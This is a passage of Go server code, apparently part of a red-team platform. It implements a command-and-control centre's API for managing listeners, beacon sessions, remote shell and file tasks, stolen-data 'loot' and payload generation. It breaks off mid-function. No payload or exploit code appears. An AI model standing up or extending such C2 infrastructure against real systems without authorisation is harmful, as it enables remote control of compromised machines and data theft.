package server

// C2 中心 REST 接口(契约 §5;路径/负载与 web/src/lib/api.ts 冻结版 c2 段对齐)。
//
// 六块:
//	总览     /api/c2/overview                     三态会话/监听器/排队任务 + 最近 10+10
//	监听器   /api/c2/listeners…                   建查改删 + start/stop(返回实际 addr)
//	会话     /api/c2/sessions…                    列表/详情/kill/sleep/bind/任务队列
//	文件     /api/c2/sessions/{id}/files… + /api/c2/transfers/{id}/download
//	战利品   /api/c2/loot…                        列表 content 恒空串,详情才解密
//	载荷     /api/c2/payloads…                    生成(201)/下载/删除
//
// 铁律:enc_key/loot 密文永不回显(列表 content 恒空串,只有 loot 详情解密);
// 集合字段 nil 一律 nonNilPtrSlice;下载接口数字 id 定位 + 路径服务端构造 +
// 包含关系校验(仿 report_export_api.go 防穿越);body 用 MaxBytesReader
// (上传 16MB,其余 1MB)。

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	c2center "github.com/Autumn-27/artex/c2center"
	pgdb "github.com/Autumn-27/artex/db"
)

// registerC2Routes 注册 C2 中心全部路由(鉴权由 Handler 的 requireAuth 统一挂载)。
func (s *Server) registerC2Routes(mux *http.ServeMux) {
	// ---- 总览 ----
	mux.HandleFunc("GET /api/c2/overview", s.c2Overview)

	// ---- 监听器 ----
	mux.HandleFunc("GET /api/c2/listeners", s.listC2Listeners)
	mux.HandleFunc("POST /api/c2/listeners", s.createC2Listener)
	mux.HandleFunc("GET /api/c2/listeners/{id}", s.getC2Listener)
	mux.HandleFunc("PUT /api/c2/listeners/{id}", s.updateC2Listener)
	mux.HandleFunc("DELETE /api/c2/listeners/{id}", s.deleteC2Listener)
	mux.HandleFunc("POST /api/c2/listeners/{id}/start", s.startC2Listener)
	mux.HandleFunc("POST /api/c2/listeners/{id}/stop", s.stopC2Listener)

	// ---- 会话 ----
	mux.HandleFunc("GET /api/c2/sessions", s.listC2Sessions)
	mux.HandleFunc("GET /api/c2/sessions/{id}", s.getC2Session)
	mux.HandleFunc("POST /api/c2/sessions/{id}/kill", s.killC2Session)
	mux.HandleFunc("POST /api/c2/sessions/{id}/sleep", s.sleepC2Session)
	mux.HandleFunc("POST /api/c2/sessions/{id}/bind", s.bindC2Session)
	mux.HandleFunc("GET /api/c2/sessions/{id}/tasks", s.listC2SessionTasks)
	mux.HandleFunc("POST /api/c2/sessions/{id}/tasks", s.createC2SessionTask)
	mux.HandleFunc("GET /api/c2/tasks/{id}/output", s.c2TaskOutput)

	// ---- 文件传输 ----
	mux.HandleFunc("GET /api/c2/sessions/{id}/transfers", s.listC2SessionTransfers)
	mux.HandleFunc("POST /api/c2/sessions/{id}/files/list", s.c2FilesList)
	mux.HandleFunc("POST /api/c2/sessions/{id}/files/upload", s.c2FilesUpload)
	mux.HandleFunc("POST /api/c2/sessions/{id}/files/download", s.c2FilesDownload)
	mux.HandleFunc("GET /api/c2/transfers/{id}/download", s.c2TransferDownload)

	// ---- 战利品 ----
	mux.HandleFunc("GET /api/c2/loot", s.listC2Loot)
	mux.HandleFunc("POST /api/c2/loot", s.createC2Loot)
	mux.HandleFunc("GET /api/c2/loot/{id}", s.getC2Loot)
	mux.HandleFunc("DELETE /api/c2/loot/{id}", s.deleteC2Loot)

	// ---- 载荷 ----
	mux.HandleFunc("GET /api/c2/payloads", s.listC2Payloads)
	mux.HandleFunc("POST /api/c2/payloads", s.createC2Payload)
	mux.HandleFunc("DELETE /api/c2/payloads/{id}", s.deleteC2Payload)
	mux.HandleFunc("GET /api/c2/payloads/{id}/download", s.c2PayloadDownload)
}

// ---- 公共小件 ----

// c2Ready 检查数据库可用(统一 503 出口)。
func (s *Server) c2Ready(w http.ResponseWriter) bool {
	if s.m == nil || s.m.PG() == nil {
		writeErr(w, 503, "数据库未初始化")
		return false
	}
	return true
}

// c2Center 取运行时(未初始化时回 503)。
func (s *Server) c2Center(w http.ResponseWriter) *c2center.Manager {
	if mgr := C2Manager(); mgr != nil {
		return mgr
	}
	writeErr(w, 503, "C2 中心未初始化")
	return nil
}

// c2PathID 解析路径里的数字 id。
func c2PathID(w http.ResponseWriter, r *http.Request) (int64, bool) {
	id, err := strconv.ParseInt(r.PathValue("id"), 10, 64)
	if err != nil || id <= 0 {
		writeErr(w, 400, "无效的 id")
		return 0, false
	}
	return id, true
}

// c2GetSessionOr404 读会话行,失败统一在此回错误。
func (s *Server) c2GetSessionOr404(w http.ResponseWriter, id int64) *pgdb.C2Session {
	m, err := s.m.PG().GetC2Session(id)
	if err != nil {
		writeErr(w, 500, err.Error())
		return nil
	}
	if m == nil {
		writeErr(w, 404, "会话不存在")
		return nil
	}
	return m
}

// c2RandomHex 生成 n 字节随机数的 hex 串(载荷 token/url_path 用)。
func c2RandomHex(n int) string {
	b := make([]byte, n)
	if _, err := io.ReadFull(rand.Reader, b); err != nil {
		// crypto/rand 失败极罕见;退化到时间戳保证非空(唯一性弱化,仅兜底)。
		return fmt.Sprintf("t%x", time.Now().UnixNano())
	}
	return hex.EncodeToString(b)
}

// sha256Hex 计算 payload 字节的 SHA-256 hex(载荷表 sha256 列)。
func sha256Hex(b []byte) string {
	sum := sha256.Sum256(b)
	return hex.EncodeToString(sum[:])
}

// c2PathUnder 报告 path 是否位于 dir 之下(防穿越:下载接口只信数字 id 定位,
// 路径由服务端构造;这里对库内取回的路径再兜一道包含关系校验)。
func c2PathUnder(path, dir string) bool {
	if path == "" || dir == "" {
		return false
	}
	absPath, err := filepath.Abs(path)
	if err != nil {
		return false
	}
	absDir, err := filepath.Abs(dir)
	if err != nil {
		return false
	}
	rel, err := filepath.Rel(absDir, absPath)
	if err != nil {
		return false
	}
	return rel != ".." && !strings.HasPrefix(rel, ".."+string(filepath.Separator))
}

// c2ListenerDisplayAddr 静态推导的展示地址(ListenerAddr 不可用时的回退):
// port=0(自动分配)时拿不到内核实际端口,返回空串。
func c2ListenerDisplayAddr(l *pgdb.C2Listener) string {
	if l == nil || l.Port <= 0 {
		return ""
	}
	host := l.BindHost
	if host == "" || host == "0.0.0.0" || host == "::" {
		host = "127.0.0.1"
	}
	return fmt.Sprintf("%s:%d", host, l.Port)
}

// c2ListenerAddrOf 运行中监听器的实际监听地址(优先 Manager.ListenerAddr——
// Agent A 的追加方法,内核分配的真实端口;未运行返回空串)。
func (s *Server) c2ListenerAddrOf(l *pgdb.C2Listener) string {
	if mgr := C2Manager(); mgr != nil && mgr.ListenerRunning(l.ID) {
		if addr := mgr.ListenerAddr(l.ID); addr != "" {
			return addr
		}
	}
	return c2ListenerDisplayAddr(l)
}

// c2ListenerDTO 是监听器响应 DTO:db 行 + runtime_addr(运行中才有,可选字段)。
type c2ListenerDTO struct {
	*pgdb.C2Listener
	RuntimeAddr string `json:"runtime_addr,omitempty"`
}

func (s *Server) c2ListenerDTOOf(l *pgdb.C2Listener) *c2ListenerDTO {
	dto := &c2ListenerDTO{C2Listener: l}
	if s.c2ListenerRunning(l.ID) {
		dto.RuntimeAddr = s.c2ListenerAddrOf(l)
	}
	return dto
}

// c2PayloadExt 载荷文件扩展名(gosrc 是 zip 工程包)。下载响应命名用;
// 落盘名以 RenderPayload 返回的 filename 为准。
func c2PayloadExt(format string) string {
	switch format {
	case pgdb.C2PayloadFormatPs1:
		return ".ps1"
	case pgdb.C2PayloadFormatBash:
		return ".sh"
	case pgdb.C2PayloadFormatPy:
		return ".py"
	default:
		return ".zip"
	}
}

// ---- 总览 ----

// c2Overview GET /api/c2/overview — 一次取齐总览(形状与 types.ts C2Overview 冻结版一致)。
func (s *Server) c2Overview(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	pg := s.m.PG()
	online, offline, dead, err := pg.CountC2SessionsByStatus()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	enabled, total, err := pg.C2ListenerCounts()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	queued, err := pg.CountQueuedC2Tasks()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	sessions, _, err := pg.ListC2Sessions(pgdb.C2SessionFilter{Limit: 10})
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	tasks, err := pg.ListRecentC2Tasks(10)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{
		"sessions_online":   online,
		"sessions_offline":  offline,
		"sessions_dead":     dead,
		"listeners_enabled": enabled,
		"listeners_total":   total,
		"tasks_queued":      queued,
		"recent_sessions":   nonNilPtrSlice(sessions),
		"recent_tasks":      nonNilPtrSlice(tasks),
	})
}

// ---- 监听器 ----

// listC2Listeners GET /api/c2/listeners
func (s *Server) listC2Listeners(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	rows, err := s.m.PG().ListC2Listeners()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	dtos := make([]*c2ListenerDTO, 0, len(rows))
	for _, l := range rows {
		dtos = append(dtos, s.c2ListenerDTOOf(l))
	}
	writeJSON(w, 200, map[string]any{"listeners": nonNilPtrSlice(dtos), "total": len(dtos)})
}

// c2ListenerPayload 是建/编监听器的请求体(同 POST 字段;密钥由服务端生成,不收)。
type c2ListenerPayload struct {
	Name     string `json:"name"`
	BindHost string `json:"bind_host"`
	Port     int    `json:"port"`
	Callback string `json:"callback"`
	URLPath  string `json:"url_path"`
	Notes    string `json:"notes"`
}

// c2ValidURLPath 信道路径随机段只允许 URL 安全字符(beacon 拼 /<url_path>/e)。
func c2ValidURLPath(p string) bool {
	if p == "" || len(p) > 64 {
		return false
	}
	for _, c := range p {
		switch {
		case c >= 'a' && c <= 'z', c >= 'A' && c <= 'Z', c >= '0' && c <= '9', c == '-', c == '_':
		default:
			return false
		}
	}
	return true
}

// createC2Listener POST /api/c2/listeners — 生成 32B key(crypto/rand)→secretbox
// 密封入库;url_path 未提供时自动生成随机段。→ 201 {id}。
func (s *Server) createC2Listener(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	var p c2ListenerPayload
	if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, 1<<20)).Decode(&p); err != nil {
		writeErr(w, 400, "invalid JSON: "+err.Error())
		return
	}
	if strings.TrimSpace(p.Name) == "" {
		writeErr(w, 400, "name 必填")
		return
	}
	urlPath := strings.TrimSpace(p.URLPath)
	if urlPath == "" {
		urlPath = c2RandomHex(8) // 16 hex 字符的随机信道路径段
	}
	if !c2ValidURLPath(strings.Trim(urlPath, "/")) {
		writeErr(w, 400, "url_path 只允许字母/数字/-/_(1-64 字符)")
		return
	}
	// 32B 明文 key 只在内存出现一次,密封后立即丢弃。
	key := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, key); err != nil {
		writeErr(w, 500, "生成监听器密钥失败: "+err.Error())
		return
	}
	sealed, err := s.sealC2Secret(key)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	id, err := s.m.PG().CreateC2Listener(pgdb.C2ListenerInput{
		Name: p.Name, BindHost: p.BindHost, Port: p.Port,
		URLPath: urlPath, Callback: p.Callback, EncKeySealed: sealed, Notes: p.Notes,
	})
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	log.Printf("[c2-center] 监听器 «%s»(#%d) 已创建(url_path=%s)", p.Name, id, urlPath)
	writeJSON(w, 201, map[string]any{"id": id})
}

// getC2Listener GET /api/c2/listeners/{id}
func (s *Server) getC2Listener(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	id, ok := c2PathID(w, r)
	if !ok {
		return
	}
	l, err := s.m.PG().GetC2Listener(id)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	if l == nil {
		writeErr(w, 404, "监听器不存在")
		return
	}
	writeJSON(w, 200, s.c2ListenerDTOOf(l))
}

// updateC2Listener PUT /api/c2/listeners/{id} — 同 POST 字段;
// 改 port/url_path 需先停(运行中回 409)。密钥不可改(改了全部已投递载荷失效)。
func (s *Server) updateC2Listener(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	id, ok := c2PathID(w, r)
	if !ok {
		return
	}
	existing, err := s.m.PG().GetC2Listener(id)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	if existing == nil {
		writeErr(w, 404, "监听器不存在")
		return
	}
	var p c2ListenerPayload
	if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, 1<<20)).Decode(&p); err != nil {
		writeErr(w, 400, "invalid JSON: "+err.Error())
		return
	}
	// 局部更新语义:未提供的字段保持原值(port=0/url_path 空串可能是「没改」)。
	port := p.Port
	if port <= 0 {
		port = existing.Port
	}
	urlPath := strings.TrimSpace(p.URLPath)
	if urlPath == "" {
		urlPath = existing.URLPath
	}
	if !c2ValidURLPath(strings.Trim(urlPath, "/")) {
		writeErr(w, 400, "url_path 只允许字母/数字/-/_(1-64 字符)")
		return
	}
	if (port != existing.Port || urlPath != existing.URLPath) && s.c2ListenerRunning(id) {
		writeErr(w, 409, "监听器运行中,请先停止再修改端口/信道路径")
		return
	}
	name := p.Name
	if strings.TrimSpace(name) == "" {
		name = existing.Name
	}
	bindHost := p.BindHost
	if strings.TrimSpace(bindHost) == "" {
		bindHost = existing.BindHost
	}
	if err := s.m.PG().UpdateC2Listener(id, pgdb.C2ListenerInput{
		Name: name, BindHost: bindHost, Port: port,
		URLPath: urlPath, Callback: p.Callback, Notes: p.Notes,
	}); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	fresh, err := s.m.PG().GetC2Listener(id)
	if err != nil || fresh == nil {
		writeErr(w, 500, "监听器已更新但回读失败")
		return
	}
	log.Printf("[c2-center] 监听器 «%s»(#%d) 已编辑", fresh.Name, id)
	writeJSON(w, 200, s.c2ListenerDTOOf(fresh))
}

// c2ListenerRunning 运行状态查询(mgr 未初始化一律视为未运行)。
func (s *Server) c2ListenerRunning(id int64) bool {
	if mgr := C2Manager(); mgr != nil {
		return mgr.ListenerRunning(id)
	}
	return false
}

// deleteC2Listener DELETE /api/c2/listeners/{id} — 有会话 409;运行中先停。
func (s *Server) deleteC2Listener(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	id, ok := c2PathID(w, r)
	if !ok {
		return
	}
	l, err := s.m.PG().GetC2Listener(id)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	if l == nil {
		writeErr(w, 404, "监听器不存在")
		return
	}
	if n, err := s.m.PG().CountC2SessionsByListener(id); err != nil {
		writeErr(w, 500, err.Error())
		return
	} else if n > 0 {
		writeErr(w, 409, fmt.Sprintf("该监听器名下还有 %d 个会话记录,请先处理(会话是审计追溯依据)", n))
		return
	}
	if s.c2ListenerRunning(id) {
		if mgr := s.c2Center(w); mgr != nil {
			if err := mgr.StopListener(id); err != nil {
				log.Printf("[c2-center] 删除前停止监听器 #%d 失败: %v", id, err)
			}
		}
	}
	deleted, err := s.m.PG().DeleteC2Listener(id)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	log.Printf("[c2-center] 监听器 «%s»(#%d) 已删除", l.Name, id)
	writeJSON(w, 200, map[string]any{"deleted": deleted})
}

// startC2Listener POST /api/c2/listeners/{id}/start — 拉起运行时;
// 端口占用等错误原文返回(前端 toast 原文)。返回 {addr}(实际监听地址,
// port=0 自动分配时为空串,见 c2ListenerDisplayAddr 注)。
func (s *Server) startC2Listener(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	id, ok := c2PathID(w, r)
	if !ok {
		return
	}
	mgr := s.c2Center(w)
	if mgr == nil {
		return
	}
	l, err := s.m.PG().GetC2Listener(id)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	if l == nil {
		writeErr(w, 404, "监听器不存在")
		return
	}
	if err := mgr.StartListener(c2centerListenerFromDB(l)); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	// 与持久化 enabled 状态对齐:启了的监听器随进程重启自动拉起。
	if err := s.m.PG().SetC2ListenerEnabled(id, true); err != nil {
		log.Printf("[c2-center] 监听器 #%d 启动态落库失败: %v", id, err)
	}
	addr := s.c2ListenerAddrOf(l)
	log.Printf("[c2-center] 监听器 «%s»(#%d) 已启动(%s)", l.Name, id, addr)
	writeJSON(w, 200, map[string]any{"addr": addr, "stopped": false})
}

// stopC2Listener POST /api/c2/listeners/{id}/stop — 停止运行时(幂等)。
func (s *Server) stopC2Listener(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	id, ok := c2PathID(w, r)
	if !ok {
		return
	}
	mgr := s.c2Center(w)
	if mgr == nil {
		return
	}
	if mgr.ListenerRunning(id) {
		if err := mgr.StopListener(id); err != nil {
			writeErr(w, 500, err.Error())
			return
		}
	}
	if err := s.m.PG().SetC2ListenerEnabled(id, false); err != nil {
		log.Printf("[c2-center] 监听器 #%d 停止态落库失败: %v", id, err)
	}
	writeJSON(w, 200, map[string]any{"addr": "", "stopped": true})
}

// ---- 会话 ----

// listC2Sessions GET /api/c2/sessions?status=&listener_id=&task_id=&company_id=&q=&limit=&offset=
func (s *Server) listC2Sessions(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	q := r.URL.Query()
	listenerID, _ := strconv.ParseInt(q.Get("listener_id"), 10, 64)
	taskID, _ := strconv.ParseInt(q.Get("task_id"), 10, 64)
	companyID, _ := strconv.ParseInt(q.Get("company_id"), 10, 64)
	items, total, err := s.m.PG().ListC2Sessions(pgdb.C2SessionFilter{
		Status:     strings.TrimSpace(q.Get("status")),
		ListenerID: listenerID,
		TaskID:     taskID,
		CompanyID:  companyID,
		Q:          strings.TrimSpace(q.Get("q")),
		Limit:      atoiDefault(q.Get("limit"), 0),
		Offset:     atoiDefault(q.Get("offset"), 0),
	})
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"sessions": nonNilPtrSlice(items), "total": total})
}

// getC2Session GET /api/c2/sessions/{id}
func (s *Server) getC2Session(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	id, ok := c2PathID(w, r)
	if !ok {
		return
	}
	m := s.c2GetSessionOr404(w, id)
	if m == nil {
		return
	}
	writeJSON(w, 200, m)
}

// killC2Session POST /api/c2/sessions/{id}/kill — 置 dead;
// meta 的 kl 由 c2center 在下次响应时从会话行派生(契约 §3,无独立 kill 信令)。
func (s *Server) killC2Session(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	id, ok := c2PathID(w, r)
	if !ok {
		return
	}
	m := s.c2GetSessionOr404(w, id)
	if m == nil {
		return
	}
	if err := s.m.PG().SetC2SessionStatusBySID(m.SID, pgdb.C2SessionStatusDead); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	log.Printf("[c2-center] 会话 #%d(%s) 已终止", m.ID, m.Hostname)
	writeJSON(w, 200, map[string]any{"killed": true})
}

// sleepC2Session POST /api/c2/sessions/{id}/sleep — {sleep_sec(1-3600),jitter_pct(0-90)}。
func (s *Server) sleepC2Session(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	id, ok := c2PathID(w, r)
	if !ok {
		return
	}
	m := s.c2GetSessionOr404(w, id)
	if m == nil {
		return
	}
	var req struct {
		SleepSec  int `json:"sleep_sec"`
		JitterPct int `json:"jitter_pct"`
	}
	if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, 1<<20)).Decode(&req); err != nil {
		writeErr(w, 400, "invalid JSON: "+err.Error())
		return
	}
	if req.SleepSec < 1 || req.SleepSec > 3600 {
		writeErr(w, 400, "sleep_sec 必须在 1-3600 之间")
		return
	}
	if req.JitterPct < 0 || req.JitterPct > 90 {
		writeErr(w, 400, "jitter_pct 必须在 0-90 之间")
		return
	}
	if err := s.m.PG().SetC2SessionSleep(m.SID, req.SleepSec, req.JitterPct); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true})
}

// bindC2Session POST /api/c2/sessions/{id}/bind — {task_id};0 = 解绑。
func (s *Server) bindC2Session(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	id, ok := c2PathID(w, r)
	if !ok {
		return
	}
	m := s.c2GetSessionOr404(w, id)
	if m == nil {
		return
	}
	var req struct {
		TaskID int64 `json:"task_id"`
	}
	if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, 1<<20)).Decode(&req); err != nil {
		writeErr(w, 400, "invalid JSON: "+err.Error())
		return
	}
	if req.TaskID < 0 {
		writeErr(w, 400, "task_id 无效")
		return
	}
	if req.TaskID > 0 {
		if _, ok := s.m.Task(strconv.FormatInt(req.TaskID, 10)); !ok {
			writeErr(w, 400, fmt.Sprintf("任务 #%d 不存在", req.TaskID))
			return
		}
	}
	if err := s.m.PG().BindC2SessionTask(m.ID, req.TaskID); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true})
}

// listC2SessionTasks GET /api/c2/sessions/{id}/tasks?after_id=&limit= — 增量拉取。
// 语义:after_id 只越过终态(done/error)任务;queued/sent 任务重复返回,
// 前端 2s 轮询靠它观察状态迁移(见 db.ListC2Tasks 注)。
func (s *Server) listC2SessionTasks(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	id, ok := c2PathID(w, r)
	if !ok {
		return
	}
	q := r.URL.Query()
	afterID, _ := strconv.ParseInt(q.Get("after_id"), 10, 64)
	tasks, err := s.m.PG().ListC2Tasks(id, afterID, atoiDefault(q.Get("limit"), 100))
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"tasks": nonNilPtrSlice(tasks)})
}

// c2NotifySession 唤醒会话挂起中的长轮询(c2center.NotifySession,追加方法):
// 刚入库的 queued 任务立刻被取走;不调用也正确(监听器 600ms 自查),只是慢一点。
func (s *Server) c2NotifySession(sessionID int64) {
	if mgr := C2Manager(); mgr != nil {
		mgr.NotifySession(sessionID)
	}
}

// c2TaskInputForKind 把端点收到的原始 input 包装成 beacon 解析约定
// (c2center.Task 注:shell={"command":…};files_list={"path":…};
// upload/download={"transfer_id":…,"remote_path":…};info 无约定原样透传)。
func c2TaskInputForKind(kind, input string) string {
	switch kind {
	case pgdb.C2TaskKindShell:
		b, _ := json.Marshal(map[string]any{"command": input})
		return string(b)
	case pgdb.C2TaskKindFilesList:
		b, _ := json.Marshal(map[string]any{"path": input})
		return string(b)
	default:
		return input
	}
}

// createC2SessionTask POST /api/c2/sessions/{id}/tasks — {kind: shell|files_list|info,
// input} → {id}。upload/download 走 files 端点(带 transfer 记账),这里不放行。
func (s *Server) createC2SessionTask(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	id, ok := c2PathID(w, r)
	if !ok {
		return
	}
	if s.c2GetSessionOr404(w, id) == nil {
		return
	}
	var req struct {
		Kind  string `json:"kind"`
		Input string `json:"input"`
	}
	if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, 1<<20)).Decode(&req); err != nil {
		writeErr(w, 400, "invalid JSON: "+err.Error())
		return
	}
	switch req.Kind {
	case pgdb.C2TaskKindShell, pgdb.C2TaskKindFilesList, pgdb.C2TaskKindInfo:
	default:
		writeErr(w, 400, "kind 只支持 shell/files_list/info(文件传输走 files 端点)")
		return
	}
	taskID, err := s.m.PG().CreateC2Task(pgdb.C2TaskInput{
		SessionID: id, Kind: req.Kind, Input: c2TaskInputForKind(req.Kind, req.Input),
		Actor: pgdb.C2TaskActorUser,
	})
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	s.c2NotifySession(id)
	writeJSON(w, 200, map[string]any{"id": taskID})
}

// c2TaskOutput GET /api/c2/tasks/{id}/output — 大输出落盘文件下载;
// 无落盘文件但行内有输出时退回行内输出(小任务一键可见)。
func (s *Server) c2TaskOutput(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	id, ok := c2PathID(w, r)
	if !ok {
		return
	}
	t, err := s.m.PG().GetC2Task(id)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	if t == nil {
		writeErr(w, 404, "任务不存在")
		return
	}
	base := ""
	if s.m != nil {
		base = s.m.dir
	}
	if t.OutputPath == "" || !c2PathUnder(t.OutputPath, c2BlobDir(base, "outputs")) {
		// 路径为空/越界:退回行内输出(密文无关,任务输出本就是命令回显)。
		if t.Output != "" {
			w.Header().Set("Content-Type", "text/plain; charset=utf-8")
			w.WriteHeader(200)
			_, _ = w.Write([]byte(t.Output))
			return
		}
		writeErr(w, 404, "该任务没有落盘输出")
		return
	}
	data, err := os.ReadFile(t.OutputPath)
	if err != nil {
		writeErr(w, 404, "输出文件不存在或已被清理")
		return
	}
	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	w.WriteHeader(200)
	_, _ = w.Write(data)
}

// ---- 文件传输 ----

// listC2SessionTransfers GET /api/c2/sessions/{id}/transfers?limit=
func (s *Server) listC2SessionTransfers(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	id, ok := c2PathID(w, r)
	if !ok {
		return
	}
	items, err := s.m.PG().ListC2Transfers(id, atoiDefault(r.URL.Query().Get("limit"), 50))
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"transfers": nonNilPtrSlice(items)})
}

// c2TransferTaskInput 构造 upload/download 任务的 input 信封(beacon 协议:
// input={transfer_id, remote_path})。
func c2TransferTaskInput(transferID int64, remotePath string) string {
	b, _ := json.Marshal(map[string]any{"transfer_id": transferID, "remote_path": remotePath})
	return string(b)
}

// c2FilesList POST /api/c2/sessions/{id}/files/list — {path} → 建任务,
// 返回 {task_id}(结果从 tasks 轮询)。beacon 回传 entries JSON [{n,s,d,m}],
// m(mtime)统一为 unix 秒(int64)——渲染口径见此注,不随本地时区/格式变。
func (s *Server) c2FilesList(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	id, ok := c2PathID(w, r)
	if !ok {
		return
	}
	if s.c2GetSessionOr404(w, id) == nil {
		return
	}
	var req struct {
		Path string `json:"path"`
	}
	if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, 1<<20)).Decode(&req); err != nil {
		writeErr(w, 400, "invalid JSON: "+err.Error())
		return
	}
	if strings.TrimSpace(req.Path) == "" {
		writeErr(w, 400, "path 必填")
		return
	}
	taskID, err := s.m.PG().CreateC2Task(pgdb.C2TaskInput{
		SessionID: id, Kind: pgdb.C2TaskKindFilesList,
		Input: c2TaskInputForKind(pgdb.C2TaskKindFilesList, req.Path), Actor: pgdb.C2TaskActorUser,
	})
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	s.c2NotifySession(id)
	writeJSON(w, 200, map[string]any{"task_id": taskID})
}

// c2FilesUpload POST /api/c2/sessions/{id}/files/upload — multipart(file + path 远端目录):
// 建 transfer → 上传任务 → blob 落 <BaseDir>/c2/uploads/<transferID>.bin → {transfer_id}。
func (s *Server) c2FilesUpload(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	id, ok := c2PathID(w, r)
	if !ok {
		return
	}
	if s.c2GetSessionOr404(w, id) == nil {
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 16<<20)
	if err := r.ParseMultipartForm(1 << 20); err != nil {
		writeErr(w, 400, "解析上传失败(上限 16MB): "+err.Error())
		return
	}
	defer func() { _ = r.MultipartForm.RemoveAll() }()
	file, header, err := r.FormFile("file")
	if err != nil {
		writeErr(w, 400, "multipart 缺少 file 字段: "+err.Error())
		return
	}
	defer file.Close() //nolint:errcheck
	remoteDir := strings.TrimSpace(r.FormValue("path"))
	if remoteDir == "" {
		writeErr(w, 400, "path(远端目录)必填")
		return
	}
	filename := sanitizeReportFilename(filepath.Base(header.Filename))
	if filename == "" || filename == "." || filename == ".." {
		writeErr(w, 400, "文件名无效")
		return
	}
	remotePath := strings.TrimRight(remoteDir, "/\\") + "/" + filename

	// 1) 传输记录(先拿 id 才能定 blob 路径与任务 input)。
	transferID, err := s.m.PG().CreateC2Transfer(pgdb.C2TransferInput{
		SessionID: id, Direction: pgdb.C2TransferUp, RemotePath: remotePath, Size: header.Size,
	})
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	failTransfer := func(code int, msg string) {
		_ = s.m.PG().UpdateC2Transfer(transferID, "error", 0, -1, "", msg)
		writeErr(w, code, msg)
	}
	// 2) 上传任务(input 带 transfer_id,beacon 拉平台 blob 分片写远端)。
	taskID, err := s.m.PG().CreateC2Task(pgdb.C2TaskInput{
		SessionID: id, Kind: pgdb.C2TaskKindUpload,
		Input: c2TransferTaskInput(transferID, remotePath), Actor: pgdb.C2TaskActorUser,
	})
	if err != nil {
		failTransfer(400, err.Error())
		return
	}
	if err := s.m.PG().SetC2TransferTask(transferID, taskID); err != nil {
		log.Printf("[c2-center] 传输 #%d 回填任务失败: %v", transferID, err)
	}
	// 3) blob 落盘(文件名带数字 id,路径只由服务端构造)。
	blobPath := filepath.Join(c2BlobDir(s.m.dir, "uploads"), fmt.Sprintf("%d.bin", transferID))
	if err := os.MkdirAll(filepath.Dir(blobPath), 0o755); err != nil {
		failTransfer(500, "建上传目录失败: "+err.Error())
		return
	}
	blob, err := os.Create(blobPath)
	if err != nil {
		failTransfer(500, "建上传文件失败: "+err.Error())
		return
	}
	_, copyErr := io.Copy(blob, file)
	closeErr := blob.Close()
	if copyErr != nil || closeErr != nil {
		failTransfer(500, "写上传 blob 失败")
		return
	}
